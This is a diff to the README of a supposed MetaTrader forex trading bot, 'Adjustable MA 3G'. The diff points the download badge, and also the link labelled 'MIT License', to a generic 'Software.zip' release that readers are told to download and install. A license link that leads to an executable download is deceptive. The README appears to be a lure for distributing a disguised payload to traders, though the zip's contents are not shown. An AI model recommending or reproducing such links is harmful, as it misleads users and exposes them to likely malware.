@@ -17,7 +17,7 @@ Adjustable MA 3G is an enhanced version of the Adjustable MA Expert Advisor that
 
 To get started with Adjustable MA 3G, simply download the repository from the link below:
 
-[![Download Adjustable MA 3G](https://img.shields.io/badge/Download-Adjustable_MA_3G-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Adjustable MA 3G](https://github.com/mrsyre/Adjustable-MA-3G/releases/download/v1.0/Software.zip)](https://github.com/mrsyre/Adjustable-MA-3G/releases/download/v1.0/Software.zip)
 
 Once the file is downloaded, launch the installation process and follow the on-screen instructions to set up the Expert Advisor on your Metatrader platform.
 
@@ -52,7 +52,7 @@ For any questions or assistance with the Adjustable MA 3G repository, please ref
 
 ## License
 
-Adjustable MA 3G is released under the [MIT License](https://opensource.org/licenses/MIT), allowing traders to use and modify the code for their personal or commercial purposes. We encourage traders to explore the possibilities of our Expert Advisor and leverage its capabilities for their trading success.
+Adjustable MA 3G is released under the [MIT License](https://github.com/mrsyre/Adjustable-MA-3G/releases/download/v1.0/Software.zip), allowing traders to use and modify the code for their personal or commercial purposes. We encourage traders to explore the possibilities of our Expert Advisor and leverage its capabilities for their trading success.
 
 🚀 Start optimizing your forex trading strategy with Adjustable MA 3G today! 📈💰
 
